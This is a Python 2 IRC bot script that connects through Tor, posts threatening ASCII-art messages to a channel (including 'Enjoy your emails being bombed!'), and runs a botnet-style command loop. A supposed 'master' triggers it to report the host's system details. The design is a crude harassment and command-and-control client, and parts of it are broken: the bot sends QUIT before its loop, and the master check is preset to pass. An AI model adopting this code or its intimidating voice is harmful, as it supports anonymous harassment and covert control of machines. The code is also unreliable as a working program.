#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import socket
import random
import platform
import sopel
import os
import time
import socks
import urllib2
import urllib

#Blue = '\x1b[0;34m'
#Brown = '\x1b[0;31m'
#Cyan = '\x1b[0;36m' 
#DarkGray = '\x1b[1;30m' 
#Green = '\x1b[0;32m' 
#LightBlue = '\x1b[1;34m' 
#LightCyan = '\x1b[1;36m' 
#LightGray = '\x1b[0;37m' 
#LightGreen = '\x1b[1;32m' 
#LightPurple = '\x1b[1;35m' 
#LightRed = '\x1b[1;31m' 
#Normal = '\x1b[0m' 
#Purple = '\x1b[0;35m' 
#Red = '\x1b[0;31m' 
#White = '\x1b[1;37m' 
#Yellow = '\x1b[1;33m



os.system('clear')

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

SERVER = "127.0.0.1"
CHANNEL = '#FR'
BOT_NICK = "MIA"
PORT = 6667
MASTER = 1
SLAVE = 1

MASTER_KEY = 'MIA'
#password = "your password"

print "\x1b[1;36mLoading..."
time.sleep(2.4)
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("BOT Connecting to " + SERVER)

irc.connect((SERVER, PORT))
irc.send("USER " + BOT_NICK + " " + BOT_NICK + " " + BOT_NICK + " :0,1" "MIA est sur T0R\n")
irc.send("NICK " + BOT_NICK + "\n")
irc.send("JOIN " + CHANNEL + "\n")
#irc.send("PASS " + password + "\n")

time.sleep(3)
irc.send('PRIVMSG ' + CHANNEL + ' :0,1Kick me ;)\r\n') 
irc.send('PRIVMSG ' + CHANNEL + ' :0,1████████╗██╗  ██╗███████╗██╗   ██╗███╗   ██╗██████╗ ███████╗██████╗  ██████╗ ██████╗  ██████╗ ██╗   ██╗███╗   ██╗██████╗ \r\n')
irc.send('PRIVMSG ' + CHANNEL + ' :0,1╚══██╔══╝██║  ██║██╔════╝██║   ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗██╔════╝ ██╔══██╗██╔═══██╗██║   ██║████╗  ██║██╔══██╗\r\n')
irc.send('PRIVMSG ' + CHANNEL + ' :0,1   ██║   ███████║█████╗  ██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝██║  ███╗██████╔╝██║   ██║██║   ██║██╔██╗ ██║██║  ██║\r\n')
irc.send('PRIVMSG ' + CHANNEL + ' :0,1   ██║   ██╔══██║██╔══╝  ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗██║   ██║██╔══██╗██║   ██║██║   ██║██║╚██╗██║██║  ██║\r\n')
irc.send('PRIVMSG ' + CHANNEL + ' :0,1   ██║   ██║  ██║███████╗╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝\r\n')
irc.send('PRIVMSG ' + CHANNEL + ' :0,1   ╚═╝   ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ \r\n')
irc.send('PRIVMSG ' + CHANNEL + ' :0,1Enjoy your emails being bombed!\r\n')  
time.sleep(1.3)  
irc.send('PRIVMSG ' + CHANNEL + ' :0,1TheUnderGround has you!\r\n') 
time.sleep(1.3) 
irc.send('PRIVMSG ' + CHANNEL + ' :0,1The Dead will live inside you forever!\r\n') 
time.sleep(1.3)                                                                                                               
irc.send('PRIVMSG ' + CHANNEL + ' :0,1Nobody can hear you scream...\r\n') 
time.sleep(1.3)
irc.send('PRIVMSG ' + CHANNEL + ' :0,1your weak\r\n') 
time.sleep(1.3)
irc.send('PRIVMSG ' + CHANNEL + ' :0,1powerless....\r\n') 
time.sleep(1.3)
irc.send('PRIVMSG ' + CHANNEL + ' :0,1Lets go for another round DING DING!\r\n') 

irc.send("QUIT \n")

while 1:
    text = irc.recv(2040)
    print(text)

    if text.find('PING') != -1:
        irc.send('PONG ' + text.split()[1] + '\r\n')

  
    try:
        aut = text.split()[0].split('@')[1]
        pas = text.split()[-1]
        if 'David' in aut and MASTER_KEY in pas:
            irc.send('PRIVMSG ' + CHANNEL + ' :Hello master! \r\n')
            MASTER = 1
    except:
        pass


    if MASTER == 1:

        if text.split()[-1] == BOT_NICK:


            if text.find('info') != -1:
                cmds = ['platform', 'system', 'node', 'release', 'version',
                        'machine', 'processor']

                for c in cmds:
                    cmd = 'platform.{0}()'.format(c)
                    info = eval(cmd)
                    irc.send('PRIVMSG ' + CHANNEL + ' :' + c + ': ' + info +
                             '\r\n')

            if text.find(':hi') != -1:
                t = text.split(':hi')
                to = t[1].strip()
                time.sleep(3)
                irc.send('PRIVMSG ' + CHANNEL + ' :0,1Dont say hi to me i will kill you! \r\n')

 